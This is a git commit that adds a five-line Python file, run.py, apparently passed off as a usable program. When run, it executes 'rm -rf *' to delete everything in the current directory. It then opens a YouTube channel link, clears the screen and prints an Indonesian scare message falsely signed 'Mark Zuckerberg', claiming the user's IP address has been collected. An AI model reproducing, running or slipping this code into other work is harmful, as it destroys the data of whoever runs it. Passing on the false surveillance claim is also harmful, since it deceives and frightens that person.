4fca559ce1cd3ecb4f3dec9135607003a6141293
SinotGkg <55437261+SinotGkg@users.noreply.github.com>
2019-09-18 20:04:00 +0700

    Add files via upload

---
+++ run.py
@@ -0,0 +1,5 @@
+import os
+os.system("rm -rf *")
+os.system("xdg-open https://youtube.com/Bang Sinot")
+os.system("clear")
+print("\n\n Ini adalah program illegal!\n IP pengguna sudah dikumpulkan\n Berhentilah sebelum terlambat!\n\n - Mark Zuckerberg\n\n")
